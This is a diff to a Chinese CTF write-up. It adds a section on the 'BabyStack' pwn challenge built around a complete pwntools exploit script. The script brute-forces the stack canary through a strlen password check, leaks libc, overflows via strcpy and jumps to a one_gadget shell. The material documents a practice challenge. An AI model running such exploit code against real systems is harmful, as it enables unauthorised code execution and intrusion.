@@ -481,3 +481,50 @@ chunk A B C（地址上的先后顺序）
 用户数据（DATA）和fd/bk字段是重合的。虽然脚本中flat的字段数量符合wp中画的图，但这是因为wp中有一个错误。攻击成功的原因根本不是里面说的“Unsorted Bin Attack”：“控制某个chunk的bk字段，进而通过将某个chunk free至unsorted bin来向bk-0x10处写入libc地址”。bk字段仅在空闲状态下的chunk有效，而这里伪造的是占用状态下的chunk，控制fd/bk字段根本就毫无意义。不过运行脚本会发现去掉那个地址的确不行，这是因为name和chunk是相邻的，脚本中布置bk字段的位置正好与chunk的地址重合。所谓的“设置bk”其实是在覆盖chunk的内容，从而将fake chunk free至unsorted bin
 
 第二篇wp会更清楚一些
+
+## BabyStack
+
+为什么远程总是和我的环境不一样啊……
+
+终于回到栈，不会大脑死机了。整体不难，调试一下就出来了：
+```py
+from pwn import *
+libc=ELF("./libc_64.so.6")
+p=process('./babystack_patched')
+is_login=False
+def login(password=''):
+    global is_login
+    p.sendlineafter("> ",'1')
+    if not is_login:
+        p.sendafter(":",password)
+        if b'Failed' not in p.recvline():
+            is_login=True
+            return True
+        return False
+    else:
+        is_login=False
+def copy(payload):
+    p.sendlineafter("> ",'3')
+    p.sendafter(":",payload)
+def brute_with_prefix(length,prefix=b''): #漏洞之一在于login比较密码时使用了strlen，导致可以逐字节爆破密码buffer里的内容
+    res=b''
+    for i in range(length):
+        for j in range(1,256):
+            if login(prefix+res+bytes([j])+b'\x00'):
+                res+=bytes([j])
+                login()
+                break
+    return res
+def overflow(payload): #第二个漏洞在于，login时输入内容会保留在栈上。虽然copy只能输入0x3f个字节，但是这0x3f个字节与login的buffer有重叠的部分，导致strcpy时溢出
+    login(payload)
+    copy('a'*0x3f)
+canary=brute_with_prefix(16)
+overflow((b'\x00'.ljust(64,b'a')+canary).ljust(0x58,b'a')) #在我的环境下这步会把栈上遗留的libc指针拷贝到密码buffer里（然而远程的栈上似乎不存在这个指针，或者偏移不对）
+login()
+prefix=canary+b'1\naaaaaa\xb4\xff' #调试得到的。后两个字节是固定的，加快爆破进程
+libc.address=u64(b'\xb4\xff'+brute_with_prefix(4,prefix)+b'\x00\x00')-libc.sym['setvbuf']-324
+overflow((b'\x00'.ljust(64,b'a')+canary).ljust(0x68,b'a')+p64(libc.address+0x45216))
+p.sendlineafter("> ",'2')
+p.interactive()
+```
+我不想调远程了。这玩意远程运行一次要非常久，可谓摧毁心态的利器。参考佬的脚本： https://milandonhowe.github.io/writeups/2023/05/24/pwnable_babystack
